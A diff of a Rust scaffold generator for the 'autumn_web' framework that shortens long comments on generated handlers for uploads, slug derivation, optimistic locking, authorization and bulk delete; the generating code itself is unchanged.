-    // sites without drifting.
+    // #1318: the two bindings the shared edit body reads for optimistic locking. `edit_form` is
+    // the first look at the record, so it never shows the conflict banner. `update`'s re-render
+    // branches bind the same names (see `update_lock_version_preamble` and
+    // `update_zero_rows_block`).
     let edit_lock_binds = if lock_version.is_some() {
         "let lock_version_value = row.lock_version;\n    let lock_conflict = false;\n    "
     } else {
@@ -5011,12 +4088,9 @@ fn render_routes_file(
     for f in &attachment_fields {
         let name = &f.name;
         let label = humanize_label(name);
-        // Issue #1349: "Current Cover:" names the file already stored, so it is
-        // a view label like any other. Per FIELD, not a shared pattern with the
-        // column name interpolated — same grammatical-agreement reasoning as
-        // `{snake}.new`. The `attachment_link` argument beside it stays the raw
-        // column name on purpose: it is the DOWNLOAD FILENAME stem, not a label,
-        // and localizing a filename is a bug, not a feature.
+        // #1349: one key per field rather than a shared pattern, for grammatical agreement. The
+        // `attachment_link` argument stays the raw column name: it is the download filename stem,
+        // not a label.
         let current_label = labels.markup(
             &format!("{snake_name}.attachment.{name}.current"),
             &format!("Current {label}: "),
@@ -5033,16 +4107,10 @@ fn render_routes_file(
         );
     }
 
-    // The read-back helpers are pure functions, so the scaffold ships real unit tests for
-    // them next to the code: `cargo test` in the generated app exercises the em-dash,
-    // no-link, and labelled-link branches and the key-sanitizing rules, rather than
-    // leaving them proven only by the generator's own string assertions. They live inside
-    // the routes module because a `tests/` integration binary cannot import a project's
-    // bin crate. Under `--i18n` the helper takes a `Locale`, so the tests build one, and
-    // it carries a real one-key bundle rather than the bare `Locale::new`, whose lookups
-    // fall back to the key itself. That keeps these assertions about the rendered meta —
-    // the media type and byte count still have to reach the string — instead of degrading
-    // them to "some key was looked up".
+    // Unit tests for the read-back helpers ship inside the routes module: a `tests/` integration
+    // binary cannot import a project's bin crate. Under `--i18n` the tests give the `Locale` a real
+    // one-key bundle, because the bare `Locale::new` falls back to the key and the assertions would
+    // no longer prove the media type and byte count are rendered.
     let (attachment_test_locale_helper, attachment_test_locale_arg) = if labels.enabled() {
         (
             r#"
@@ -5150,33 +4218,21 @@ mod attachment_read_back_tests {{
         String::new()
     };
 
-    // #1872: the create and update handlers stream each uploaded file to the blob store
-    // before changeset validation and the DB write, so any early return after the save
-    // would orphan the just-uploaded blob. Only the freshly-saved `<field>_blob`s are
-    // recorded, into `saved_blob_keys`, pushed at the point of each save so the key set
-    // fills incrementally, and best-effort deleted before every early-return path that can
-    // occur after the first save.
+    // #1872: create and update stream each upload to the blob store before validation and the DB
+    // write, so every early return after a save must delete the saved blobs. Each save pushes its
+    // key onto `saved_blob_keys`; a preserved existing blob is never enrolled.
     //
-    // The whole fallible multipart-parse-and-decode span — `next_field()?`, each
-    // `save_to_blob_store()?`, `bytes_limited()?`, the UTF-8 `map_err(…)?`, and
-    // `decode_form(…)?` — runs inside one `async { … }.await` block typed to the handler's
-    // `AutumnError`, whose `Err` funnels through a single cleanup path
-    // (`form_decode_block`). That covers every `?` in the span, current and future,
-    // without per-line wrapping, so a malformed boundary, oversized text field, or invalid
-    // UTF-8 arriving after a blob was saved can no longer leak it. The remaining
-    // post-parse early returns — changeset validation, `into_new`, the unique-violation
-    // 422, the generic DB error, and the update's current-row load or not-found — sit
-    // outside that block and keep splicing `{blob_cleanup}` before their `return`. A
-    // preserved existing blob is never enrolled.
+    // Every `?` in the multipart parse-and-decode span runs inside one `async { … }.await` block
+    // whose `Err` goes through a single cleanup path (`form_decode_block`). The early returns after
+    // that block (validation, `into_new`, the unique-violation 422, the DB error, the update's
+    // current-row load) splice `{blob_cleanup}` before their `return`.
     let blob_cleanup = if has_attachments {
         "for key in &saved_blob_keys {\n        let _ = store.delete(key).await;\n    }\n    "
     } else {
         ""
     };
-    // Issue #1872 follow-on: this check sits *after* the uploaded file was
-    // streamed to the store, so a plain `?` here would orphan the blob whenever
-    // the record policy denies the actor. It gets the same cleanup-then-return
-    // treatment as every other post-save early return.
+    // #1872: this check runs after the upload was saved, so a plain `?` would orphan the blob
+    // when the policy denies the actor.
     let authz_attachment_update = if authorize && has_attachments {
         format!(
             "if let Err(err) = autumn_web::authorization::authorize::<{pascal_name}>({create_update_state_expr}, &session, \"update\", &current).await {{\n        \
@@ -5195,15 +4251,8 @@ mod attachment_read_back_tests {{
                 blob_decls,
                 "    let mut {name}_blob: Option<autumn_web::storage::Blob> = None;"
             );
-            // Issue #1872: record the freshly-saved blob's key into
-            // `saved_blob_keys` *immediately* after each successful save, so any
-            // later fallible early return (a subsequent attachment field's save,
-            // `decode_form`, validation, the DB write) can best-effort delete it.
-            // The save's own `?` (and every other fallible `?` in the parse span)
-            // is covered centrally: the whole multipart-parse-and-decode section
-            // runs inside a single `async {…}` block whose `Err` is funneled
-            // through one cleanup path (see `form_decode_block`), so a failed save
-            // cleans up any earlier-saved sibling blobs without per-line wrapping.
+            // Push the key right after each save so later early returns can delete it. A failed
+            // save is covered by the cleanup path around the parse block.
             let _ = write!(
                 match_arms,
                 "            Some(\"{name}\") => {{\n                \
@@ -5260,10 +4309,8 @@ mod attachment_read_back_tests {{
     } else {
         format!("let form = {decode_call};")
     };
-    // Issue #1872: for attachment scaffolds `into_new` runs *after* the blob save,
-    // so its fallible parse (`?`) must first clean up the just-saved blob(s). We
-    // emit an explicit `match` that runs the cleanup then returns the same error
-    // the `?` would have produced.
+    // #1872: with attachments `into_new` runs after the blob save, so its error path deletes the
+    // saved blobs before returning.
     let into_new_bind = format!(
         "let mut new = match into_new(changeset.data()) {{\n        \
          Ok(new) => new,\n        \
@@ -5272,26 +4319,15 @@ mod attachment_read_back_tests {{
          }}\n    \
          }};"
     );
-    // Create: build `New{Pascal}`, then bind each streamed blob. A `None` blob means no
-    // file was submitted, so the column stays NULL, satisfying the
-    // optional-empty-as-NULL acceptance criterion.
+    // Create binds each streamed blob; a `None` blob leaves the column NULL.
     //
-    // #1260 AC4: on create, when the submitted slug is blank, derive it from the `from`
-    // source field via `autumn_web::slugify`, then probe for a collision and append a
-    // deterministic `-2`, `-3`, … suffix until a free value is found. Two records deriving
-    // the same base slug — two posts both titled "Hello" — then get distinct URLs instead
-    // of a 422 on the `UNIQUE INDEX`. A non-blank submitted slug, which the form exposes
-    // as a plain text input, passes through untouched; its uniqueness is still enforced by
-    // the existing `unique`-field violation handling below.
+    // #1260: on create, a blank slug is derived from the `from` field with `autumn_web::slugify`,
+    // then suffixed `-2`, `-3`, … until free, so two posts titled "Hello" get distinct URLs
+    // instead of a 422. A submitted slug passes through; unique-violation handling still applies.
     //
-    // A derived value equal to a static sibling route segment is treated as taken even
-    // though it is not in the table yet: axum's router (matchit) always prefers a static
-    // route over the `GET /{plural}/{slug}` capture, so a record whose slug were literally
-    // "new" — or "search", when `--searchable` emits `GET /{plural}/search`, or "trash",
-    // which #1332 adds — would never be reachable at its own show page. A post titled
-    // "Trash" would otherwise be permanently shadowed by the trash view. This guards the
-    // derived path only: an explicitly submitted slug of one of these is not rejected
-    // here, matching this AC's blank-only scope.
+    // A derived slug equal to a static sibling segment ("new", "search", "trash", "import") counts
+    // as taken: the router prefers the static route over `GET /{plural}/{slug}`, so the record's
+    // show page would be unreachable. Only derived slugs are checked against these.
     let reserved_segment_guard = {
         let mut guard = String::from("candidate != \"new\"");
         if search_enabled {
@@ -5300,9 +4336,6 @@ mod attachment_read_back_tests {{
         if trash_enabled {
             guard.push_str(" && candidate != \"trash\"");
         }
-        // Issue #1393 adds `GET /{plural}/import` to the static siblings, so a
-        // record whose title derives the slug "import" must be treated as taken
-        // too — otherwise it would be permanently shadowed by the upload form.
         if import_enabled {
             guard.push_str(" && candidate != \"import\"");
         }
@@ -5351,15 +4384,9 @@ mod attachment_read_back_tests {{
     } else {
         format!("let new = {into_new_call};")
     };
-    // Issue #1260 review finding: `update` needs the SAME blank-derives-a-slug
-    // behavior `create` has — a submitted slug isn't required (AC4's "plain
-    // optional text input"), so clearing it on edit must re-derive rather
-    // than persist an empty string that breaks the record's own `/{slug}`
-    // route. Identical to `slug_derive_block` except the collision probe
-    // excludes the record's OWN current row via `{id_value_expr}` (the path
-    // extractor's still-old value) — otherwise re-deriving to the same slug
-    // a no-op edit would produce (title unchanged) would spuriously collide
-    // with itself and pick up an unwanted `-2` suffix.
+    // Clearing the slug on edit re-derives it the same way, rather than saving an empty slug that
+    // breaks the record's own `/{slug}` route. The collision probe excludes the record's own row
+    // (`{id_value_expr}`), or an unchanged title would collide with itself and gain a `-2` suffix.
     #[allow(clippy::option_if_let_else)] // nested map_or_else closures read worse here
     let update_slug_derive_block = if let Some(slug) = slug_field {
         let field = &slug.name;
@@ -5392,18 +4419,12 @@ mod attachment_read_back_tests {{
     } else {
         String::new()
     };
-    // Update: preserve the existing blob when no new file was uploaded
-    // (`streamed.or(current)`), so an edit that does not touch the file leaves the stored
-    // attachment intact instead of nulling it. The current row is loaded through the same
-    // handle the update statement uses — the repository on the live path, the sharded repo
-    // on the sharded path, diesel otherwise. The load is spliced in before the validation
-    // guard, not after (#1236 AC3), because every 422 re-render of the edit form has to
-    // show which file is currently stored: a file input cannot be repopulated. Loading
-    // first also runs the record policy before the re-render, so a forbidden actor is
-    // denied instead of being handed the form back.
+    // Update keeps the stored blob when no new file was uploaded (`<field>_blob.or(current…)`).
+    // The current row is loaded, through the same handle the update uses, before the validation
+    // guard (#1236): every 422 re-render must show the stored file. Loading first also runs the
+    // record policy before any re-render.
     let (update_load_and_authorize_block, update_new_block) = if has_attachments {
-        // Issue #1872: loading the current row also happens after the blob save,
-        // so its fallible steps clean up the just-saved blob(s) before returning.
+        // #1872: this load runs after the blob save, so its error paths clean up first.
         let load_current = if live && !sharded {
             format!(
                 "let current = match repo.find_by_id(*id).await {{\n        \
@@ -5446,9 +4467,8 @@ mod attachment_read_back_tests {{
         let mut binds = String::new();
         for f in &attachment_fields {
             let name = &f.name;
-            // `.clone()` rather than a move: `current` stays whole so the
-            // unique-violation 422 further down can still render the currently
-            // stored attachment from it (issue #1236, AC3).
+            // Clone, not move: the unique-violation 422 still renders the stored attachment
+            // from `current`.
             let _ = write!(
                 binds,
                 "\n    new.{name} = {name}_blob.or(current.{name}.clone());"
@@ -5467,25 +4487,18 @@ mod attachment_read_back_tests {{
         (String::new(), format!("let new = {into_new_call};"))
     };
 
-    // Shared re-render bodies: the same `layout(...)` markup the GET handlers emit, reused
-    // verbatim by the 422 branches so the form cannot drift. Both read from a
-    // `Changeset<{Pascal}Form>` named `changeset` and the CSRF params now on every create
-    // and update signature.
+    // Shared re-render bodies: the GET handlers' `layout(...)` markup, reused by the 422 branches
+    // so the form cannot drift. Both read a `Changeset<{Pascal}Form>` named `changeset` and the
+    // CSRF params.
     //
-    // #1135: the standard scaffold renders the whole form through one shared
-    // `{snake}_form_for` helper — a single `form_for` call deriving every control from the
-    // `FormModel` descriptors — so the view bodies carry no per-column code.
-    // `--live-validation` keeps the per-field emission path: its htmx inline-validation
-    // inputs (`text_input_htmx`) have no `FieldControl` equivalent to dispatch to.
+    // #1135: the standard scaffold renders the form through one `{snake}_form_for` helper.
+    // `--live-validation` emits each field itself: its htmx inputs (`text_input_htmx`) have no
+    // `FieldControl` equivalent.
     //
-    // #1318 (AC3): the inline conflict banner, rendered above the edit form by both
-    // paths and gated on the `lock_conflict` binding every splice site provides, so a
-    // stale submit lands the author back on their own edits with an explanation rather
-    // than on a dead-end error page. A bare "409 Conflict" tells a non-technical author
-    // nothing. Under `--i18n` (#1349) the banner is the one thing an author reads when
-    // their save is rejected, so it is the last place to fall back to English. Recorded
-    // only when the scaffold has a lock column: an `en.ftl` key no view references fails
-    // `autumn i18n check --strict`.
+    // #1318: the conflict banner above the edit form, gated on the `lock_conflict` binding every
+    // splice site provides, so a stale submit returns the author to their own edits with an
+    // explanation instead of a bare 409. Its key is recorded only when the scaffold has a lock
+    // column: an `en.ftl` key no view references fails `autumn i18n check --strict`.
     let lock_conflict_banner = if lock_version.is_some() {
         format!(
             "@if lock_conflict {{\n            \
@@ -5509,22 +4522,13 @@ mod attachment_read_back_tests {{
     } else {
         ""
     };
-    // The hidden field is read straight off the raw body rather than through
-    // `{Pascal}Form`: the version is not one of the model's editable columns, so it has no
-    // place on the form struct, which would render it as a visible control and let a
-    // submit set it like any other value. `serde_urlencoded` ignores the unknown pair when
-    // decoding the form, so the two coexist.
+    // `lock_version` is read off the raw body, not through `{Pascal}Form`: it is not an editable
+    // column, and `serde_urlencoded` ignores the unknown pair. A missing or unparsable value is a
+    // 400, not `0`, which could match a fresh row.
     //
-    // A missing or unparsable value is a 400, not a silent `0`: `0` would be a plausible
-    // version that could match a freshly created row and wave a hand-crafted submit past
-    // the guard.
-    //
-    // It scans every `lock_version` pair for the first that parses as an integer, rather
-    // than taking the first pair and parsing that. The CSRF and submit-token field names
-    // are app-configurable, so an app may legitimately name one of them `lock_version` —
-    // and those hidden inputs are prepended, so they land in the body first. Stopping at
-    // the first pair would read a UUID, fail to parse it, and 400 every update even though
-    // the real version was a few bytes later.
+    // It takes the first `lock_version` pair that parses: the CSRF and submit-token field names
+    // are configurable, so an app may name one `lock_version`, and those hidden inputs come first
+    // in the body.
     let lock_version_parser = lock_version.map_or_else(String::new, |_| {
         format!(
             "\n/// Read the hidden `lock_version` the edit form was rendered with\n\
@@ -5545,12 +4549,8 @@ mod attachment_read_back_tests {{
         )
     });
     let (new_form_body, edit_form_body, form_for_helper) = if live_validation {
-        // Issue #1124: `new_form`, `edit_form`, and both 422 re-render
-        // branches render the same inputs from a `Changeset<{Pascal}Form>`
-        // variable named `changeset`, so one renderer serves every site and
-        // the markup can never drift between them. Preserved values and
-        // inline errors come from the changeset via the shipped
-        // `autumn_web::form` helpers.
+        // `new_form`, `edit_form` and both 422 re-render branches render from one
+        // `Changeset<{Pascal}Form>` named `changeset`, so their markup cannot drift (#1124).
         let changeset_inputs = render_changeset_form_inputs(
             fields,
             "changeset",
@@ -5558,12 +4558,9 @@ mod attachment_read_back_tests {{
             &validated_fields,
             &reference_fields,
         );
-        // Issue #1750: the belongs_to parent `<select>` (rendered inline by
-        // `render_changeset_form_inputs` via `render_live_reference_select`)
-        // reads a request-time `{name}_options` binding, so — exactly like the
-        // standard path — the new/edit form bodies load the options before the
-        // markup. The block wraps the `layout(...)` call so it splices into the
-        // GET handlers and the 422 re-render branches unchanged.
+        // The belongs_to `<select>` reads a request-time `{name}_options` binding, so the form
+        // bodies load the options first (#1750), in a block around the `layout(...)` call so the
+        // body splices into the GET handlers and the 422 branches unchanged.
         let mut option_loads = String::with_capacity(reference_fields.len() * 80);
         for f in &reference_fields {
             let name = &f.name;
@@ -5572,12 +4569,8 @@ mod attachment_read_back_tests {{
                 "        let {name}_options = {name}_select_options(&mut db).await?;"
             );
         }
-        // Issue #1706: the primary submit control is emitted through the typed
-        // `autumn_web::a11y::Button` primitive, whose constructor requires an
-        // accessible name — a nameless submit button is a compile error in the
-        // generated app. The destructive delete button below stays raw markup:
-        // it carries an `onclick` confirm the current `Button` API can't express,
-        // and converting would drop the confirmation guard.
+        // The submit control is an `a11y::Button`, which requires an accessible name (#1706).
+        // The delete button stays raw markup: `Button` cannot express its `onclick` confirm.
         let new_form_layout = format!(
             "{layout_fn}({new_title}, {cp_new}{flash_arg}, html! {{\n        \
              h1 {{ {new_heading} }}\n        \
@@ -5611,21 +4604,15 @@ mod attachment_read_back_tests {{
             &edit_attachment_url_binds,
             &resource_bind_form,
         );
-        // The referenced-row option loaders are emitted regardless: they
-        // populate the in-form `<select>` (issue #1750). The issue #1146 index
-        // parent-label map is built separately, scoped to the page's own rows
-        // (`render_index_reference_label_loads`, #835) rather than through
-        // these loaders, which fetch every row of the referenced table — right
-        // for a `<select>`'s full option list, wrong for labeling ~20 rows.
+        // These loaders fetch every referenced row, which suits a `<select>` but not labeling
+        // one index page, so the index label map is built separately
+        // (`render_index_reference_label_loads`).
         let option_loaders =
             render_reference_option_loaders(&display_reference_fields, db_ty, &reference_displays);
         (new_form_body, edit_form_body, option_loaders)
     } else {
-        // Reference selects: load the referenced ids before rendering and
-        // thread them into the shared helper (issue #1135, AC 2
-        // "references→select"). The loads live in a block expression wrapped
-        // around the `layout(...)` call so the same body splices into the GET
-        // handlers and the 422 re-render branches unchanged.
+        // Reference selects (#1135): load the options and pass them to the shared helper. As
+        // above, the loads wrap the `layout(...)` call so the body splices in unchanged.
         let mut option_loads = String::new();
         let mut option_args = String::new();
         for f in &reference_fields {
@@ -5636,21 +4623,15 @@ mod attachment_read_back_tests {{
             );
             let _ = write!(option_args, ", &{name}_options");
         }
-        // Issue #1326: the shared `{snake}_form_for` helper gains an
-        // `exclude_state_fields` flag only when the model has a state-machine
-        // column; the create form keeps the column (initial state) while the
-        // edit form drops it (transition-only). A no-state-machine model passes
-        // no extra argument, keeping the pre-#1326 call byte-identical.
+        // `exclude_state_fields` exists only with a state-machine column: the create form keeps
+        // it (initial state), the edit form drops it (transition-only) (#1326).
         let form_exclude_create = if has_state_machine { ", false" } else { "" };
         let form_exclude_edit = if has_state_machine { ", true" } else { "" };
-        // Issue #1318: the same shape for the optimistic-locking version — the
-        // edit call hands the helper the version to hide in the form, the create
-        // call `None` (no row, no version). Absent entirely without the column.
+        // With a lock column, edit passes the version to hide in the form; create has no row,
+        // so it passes `None` (#1318).
         let form_lock_create = if lock_version.is_some() { ", None" } else { "" };
-        // Issue #1323: the FLAT create/edit forms keep the belongs_to select
-        // (#1146) — only the nested inline form drops it — so both pass `false`
-        // for the helper's `exclude_parent_fk` flag. Absent without
-        // `--belongs-to`, keeping the pre-#1323 call byte-identical.
+        // `exclude_parent_fk`: the flat forms keep the belongs_to select; only the nested inline
+        // form drops it (#1323).
         let form_parent_fk = if nesting.is_some() { ", false" } else { "" };
         let form_lock_edit = if lock_version.is_some() {
             ", Some(lock_version_value)"
@@ -5698,25 +4679,18 @@ mod attachment_read_back_tests {{
     };
     let form_model_impl = render_form_model_impl(pascal_name);
 
-    // `unique` fields (issue #1032) still classify DB constraint violations,
-    // but now feed the error into the *same* changeset renderer via
-    // `Changeset::from_errors`, so a duplicate value shows an inline error
-    // through the shipped helpers just like a validation failure.
+    // A `unique` violation becomes an inline changeset error via `Changeset::from_errors`,
+    // shown like a validation failure (#1032).
     let unique_constraints_const = if unique_fields.is_empty() {
         String::new()
     } else {
         render_unique_constraints_const(plural, &unique_fields, all_fields)
     };
 
-    // #1349: "has already been taken" is shown to whoever submitted the duplicate, so it
-    // is view text like any other. It cannot come from `UNIQUE_CONSTRAINTS` under
-    // `--i18n` — that is a `const`, evaluated before there is a request to have a locale —
-    // so the const keeps its (constraint, field) mapping and the message is looked up
-    // where the changeset error is built, in a handler that holds the extractor. One
-    // shared key rather than one per field: the const's message is the same sentence for
-    // every column. Recorded only when the scaffold has a unique column, for the same
-    // reason as the attachment meta — an `en.ftl` key no view references fails `autumn
-    // i18n check --strict`.
+    // "has already been taken" is view text (#1349). Under `--i18n` it cannot come from the
+    // `UNIQUE_CONSTRAINTS` const, which has no request and so no locale; it is looked up where
+    // the changeset error is built. One key serves every column. Recorded only with a unique
+    // column: an `en.ftl` key no view references fails `autumn i18n check --strict`.
     let (unique_message_binding, unique_message_expr) = if unique_fields.is_empty() {
         ("message", "message.to_string()".to_owned())
     } else {
@@ -5736,9 +4710,8 @@ mod attachment_read_back_tests {{
     };
 
     let create_insert_block = if !unique_fields.is_empty() {
-        // Issue #1872: `{blob_cleanup}` (empty unless the scaffold has attachment
-        // fields) best-effort deletes the just-saved blob(s) on both the
-        // unique-violation 422 and the generic DB-error early returns.
+        // `{blob_cleanup}` (empty without attachments) deletes the just-saved blobs on each
+        // early return (#1872).
         format!(
             "let result: AutumnResult<()> = async {{\n        \
              {create_stmt}\n        \
@@ -5757,8 +4730,7 @@ mod attachment_read_back_tests {{
              Ok(autumn_web::Redirect::to(&paths::index()).into_response())"
         )
     } else if has_attachments {
-        // Issue #1872: no unique constraints to classify, but the DB write can
-        // still fail after the blob save — clean up before returning the error.
+        // The DB write can still fail after the blob save, so clean up first (#1872).
         format!(
             "let result: AutumnResult<()> = async {{\n        \
              {create_stmt}\n        \
@@ -5777,9 +4749,7 @@ mod attachment_read_back_tests {{
              Ok(autumn_web::Redirect::to(&paths::index()).into_response())"
         )
     };
-    // Issue #1125: on the standard authorized path, run the policy's `can_create`
-    // check before building/inserting the changeset. Create has no loaded row yet,
-    // so this uses `authorize_create` (context-only) rather than `authorize`.
+    // Create has no row yet, so it uses the context-only `authorize_create` (#1125).
     let authz_create_call = if authorize {
         format!(
             "autumn_web::authorization::authorize_create::<{pascal_name}>({create_update_state_expr}, &session).await?;\n    "
@@ -5805,29 +4775,16 @@ mod attachment_read_back_tests {{
          }}\n"
     );
 
-    // What the `update` handler does when its `UPDATE` matched no rows.
+    // What `update` does when its `UPDATE` matched no rows. Without a lock column the row is
+    // gone: 404. With a `lock_version` guard (#1318) the handler re-reads the row:
     //
-    // Without optimistic locking that can only mean the row is gone: 404, as before. With
-    // a `lock_version` guard (#1318) it is ambiguous — the row may be missing, or the
-    // version may have moved on under us — so the handler re-reads it to tell the two
-    // apart:
+    //   * still there: a concurrent editor committed a newer version. Re-render the edit body
+    //     at 409 with the submitted values and the row's current version. Carrying the stale
+    //     version forward would make every resubmit lose the same race.
+    //   * gone: 404.
     //
-    //   * still there → someone else committed a newer version between the edit-form load
-    //     and this submit. Re-render the same edit body at 409 with the user's submitted
-    //     values intact, an inline banner, and the row's current version in the hidden
-    //     field. Carrying the stale version forward would make the form permanently
-    //     unsavable: every resubmit would lose the same race.
-    //   * gone → the pre-#1318 404.
-    //
-    // `{blob_cleanup}` and the id expression differ per branch, so both are parameters;
-    // without a lock column the output is the pre-#1318 text verbatim.
-    //
-    // The re-read row is re-authorized before anything from it is used. The policy check
-    // at the top of `update` ran against the snapshot this request loaded, and a record
-    // policy can depend on mutable row data, so the concurrent write that moved the
-    // version may also have moved the row out of this actor's reach. Only the version
-    // integer crosses over — the re-render shows the author's own submitted values — but
-    // re-checking costs one call and removes the whole class. Empty without a policy.
+    // The re-read row is re-authorized: a record policy can depend on mutable row data, so
+    // the concurrent write may have moved the row out of this actor's reach.
     let conflict_reauthz = if authorize {
         format!(
             "            autumn_web::authorization::authorize::<{pascal_name}>({create_update_state_expr}, &session, \"update\", &current).await?;\n"
@@ -5863,14 +4820,11 @@ mod attachment_read_back_tests {{
         )
     };
 
-    // A slug field is always `unique` (issue #1260), so a slug scaffold
-    // always takes THIS branch — the `has_attachments`/plain branches below
-    // still hard-code the pre-#1260 `*id` literal, safe only because they're
-    // unreachable whenever a slug field is present.
+    // A slug field is always `unique` (#1260), so a slug scaffold always takes this branch.
+    // The branches below hard-code `*id`, which is safe only because of that.
     let update_apply_block = if !unique_fields.is_empty() {
-        // Issue #1872: `{blob_cleanup}` (empty unless the scaffold has attachment
-        // fields) best-effort deletes the just-saved blob(s) on the
-        // unique-violation 422, the generic DB-error, and the not-found returns.
+        // `{blob_cleanup}` (empty without attachments) deletes the just-saved blobs on the
+        // 422, DB-error and not-found returns (#1872).
         format!(
             "let result: AutumnResult<usize> = async {{\n        \
              {update_stmt}\n        \
@@ -5896,8 +4850,8 @@ mod attachment_read_back_tests {{
             zero_rows = update_zero_rows_block(blob_cleanup, &id_value_expr),
         )
     } else if has_attachments {
-        // Issue #1872: no unique constraints, but the update write and the
-        // not-found guard both early-return after the blob save — clean up first.
+        // The write and the not-found guard both return after the blob save, so clean up
+        // first (#1872).
         format!(
             "let result: AutumnResult<usize> = async {{\n        \
              {update_stmt}\n        \
@@ -5927,12 +4881,8 @@ mod attachment_read_back_tests {{
             zero_rows = update_zero_rows_block("", "*id"),
         )
     };
-    // Issue #1125/#1830: load the target row and run the policy check *before*
-    // touching it, so a forbidden actor is denied (404/403 per config) before any
-    // write. Loading first also gives the same not-found behavior the post-update
-    // `updated == 0` guard provides. The load handle depends on the variant: the
-    // `repo` extractor on `--live`, a `from_shard` repository on `--sharded`, and
-    // raw diesel otherwise — all three yield the same `{Pascal}` row type.
+    // Load the row and authorize before any write, so a forbidden actor is denied before
+    // anything changes (#1125, #1830).
     let load_current_stmt = |binding: &str| -> String {
         if live && !sharded {
             format!(
@@ -5955,10 +4905,8 @@ mod attachment_read_back_tests {{
             )
         }
     };
-    // Update: on the attachment path the handler already loads `current` (after
-    // parsing multipart, to preserve un-replaced blobs) and authorizes there via
-    // `authz_attachment_update`, so no up-front preamble is emitted. Every other
-    // variant loads + authorizes here.
+    // On the attachment path `update` loads `current` after parsing multipart and authorizes
+    // there (`authz_attachment_update`), so it gets no preamble.
     let authz_update_preamble = if authorize && !has_attachments {
         format!(
             "{load}autumn_web::authorization::authorize::<{pascal_name}>({state}, &session, \"update\", &current).await?;\n    ",
@@ -5968,8 +4916,8 @@ mod attachment_read_back_tests {{
     } else {
         String::new()
     };
-    // Destroy: no form body, so always load + authorize up front (`&state`, since
-    // `destroy` takes the full `State` pair even on the attachment path).
+    // Destroy has no form body, so it always loads and authorizes up front. It passes
+    // `edit_destroy_state_expr`: `destroy` takes the full `State` pair even with attachments.
     let authz_destroy_preamble = if authorize {
         format!(
             "{load}autumn_web::authorization::authorize::<{pascal_name}>({state}, &session, \"delete\", &current).await?;\n    ",
@@ -5986,12 +4934,9 @@ mod attachment_read_back_tests {{
     } else {
         String::new()
     };
-    // Issue #1318: read the version the edit form was rendered against out of
-    // its hidden field, and seed the two bindings the shared edit body renders
-    // from. Both are re-bound (shadowed) by the 409 branch in
-    // `update_zero_rows_block`; on the 422 branches they keep these values, so a
-    // validation failure hands the same version back and the author's next
-    // submit still races against the row they actually opened.
+    // Seed the edit body's bindings from the hidden `lock_version` (#1318). The 409 branch
+    // rebinds them; the 422 branches keep them, so the next submit still races against the
+    // row the author opened.
     let update_lock_version_preamble = lock_version.map_or_else(String::new, |_| {
         "let expected_lock_version = parse_lock_version(&body)?;\n    \
          let lock_version_value = expected_lock_version;\n    \
@@ -6031,12 +4976,9 @@ mod attachment_read_back_tests {{
          }}\n"
     );
 
-    // ── issue #1312: bulk-select + delete-selected ─────────────────────────
+    // ── Bulk select and delete-selected (#1312) ─────────────────────────────
     //
-    // The bulk-select form struct (issue #3394 retired the hand-written
-    // `parse_bulk_ids`). Emitted next to `csrf_input` / `submit_token_input`
-    // and only when the bulk gate is on, so the `--live`/`--sharded` output is
-    // byte-identical.
+    // The bulk-select form struct, emitted only behind the bulk gate.
     let bulk_ids_parser = if bulk_delete_enabled {
         "\n/// Most rows one bulk submit may touch.\n\
          ///\n\
@@ -6061,9 +5003,8 @@ mod attachment_read_back_tests {{
     } else {
         ""
     };
-    // `POST /{plural}/bulk_delete`. Emitted straight after the `index` handler
-    // it serves (and before `show`), so the list view and its bulk action read
-    // together.
+    // `POST /{plural}/bulk_delete`, emitted right after `index` so the list and its bulk action
+    // read together.
     let bulk_delete_fn = if bulk_delete_enabled {
         // Same `State` + `Session` pair `destroy` takes when policy wiring is on.
         let authz_params = if authorize {
@@ -6071,11 +5012,8 @@ mod attachment_read_back_tests {{
         } else {
             String::new()
         };
-        // Soft-delete: an already-deleted row is invisible to the list, so it must
-        // stay out of the selection too (matching `destroy`'s `deleted_at IS NULL`
-        // filter). The actual delete still routes through `delete_many`, which
-        // applies the repository's soft-delete + `dependent(...)` cascade rules.
-        // Trailing indent lines the chained call up inside the chunk loop below.
+        // A soft-deleted row is hidden from the list, so keep it out of the selection too, as
+        // `destroy` does. The trailing indent aligns the chained call inside the chunk loop.
         let soft_delete_filter = if soft_delete {
             format!(".filter({plural}::deleted_at.is_null())\n            ")
         } else {
@@ -6187,15 +5125,12 @@ mod attachment_read_back_tests {{
         String::new()
     };
 
-    // Template splice bindings for the generated form struct, its conversion,
-    // the edit-form seed, and (when present) the datetime parse helper.
     let form_struct = &model_form.form_struct;
     let into_new_fn = &model_form.into_new_fn;
     let from_row_impl = &model_form.from_row_impl;
     let parse_datetime_helper = &model_form.datetime_helper;
-    // `\x` + hex helpers (issue #2330). The encoder serves the form and the
-    // export; the decoder only the form. Each is emitted only where used: an
-    // unused `fn` is a `dead_code` warning in the generated app.
+    // `\x` + hex helpers (#2330): the encoder serves the form and the export, the decoder only
+    // the form. Each is emitted only where used: an unused `fn` warns `dead_code` in the app.
     let form_has_bytea = fields.iter().any(|f| f.kind == FieldKind::Bytea);
     let export_has_bytea = export_enabled
         && all_fields
@@ -6211,16 +5146,9 @@ mod attachment_read_back_tests {{
         bytea_helpers.push_str(BYTEA_HEX_FROM_FN);
     }
 
-    // The `index` handler. When sharded, use `from_shard` explicitly so the generated code
-    // shows the canonical sharding pattern.
-    //
-    // Live (SSE) variant: keep the `<ul>`/`<li>` structure intact. `LiveFragment` renders
-    // `li id=…` and `insert_swap()` targets `#{plural}-list` via
-    // `OobSwap::Target(BeforeEnd, …)`, so swapping to `<table>` would make the SSE
-    // broadcast append `<li>` into a `<table>` at runtime, which is invalid HTML. The
-    // table migration for the live path waits on `LiveFragment` supporting `<tr>`
-    // fragments. Non-live variants use `data_table`, so the index shows real fields out of
-    // the box with no hand-authored `<table>`/`<th>`/`<td>` tags.
+    // The live (SSE) index keeps a `<ul>`: `LiveFragment` renders `li` and `insert_swap()`
+    // appends to `#{plural}-list`, so a `<table>` would receive `<li>`s, which is invalid
+    // HTML. Non-live variants use `data_table`.
     let li_render = if live {
         format!(
             r#"li id=(format!("{snake_name}-{{}}", row.id)) {{ a href=(paths::show(row.id)) {{ "{pascal_name} #{{}}" (row.id) }} }}"#
@@ -6229,8 +5157,6 @@ mod attachment_read_back_tests {{
         String::new() // unused in the non-live path
     };
 
-    // For the live path we keep the original <ul> list so the SSE OOB-swap
-    // contract remains valid.
     let live_ul_render = if live {
         format!(
             r#"@if page_req.page() == 1 {{
@@ -6251,20 +5177,14 @@ mod attachment_read_back_tests {{
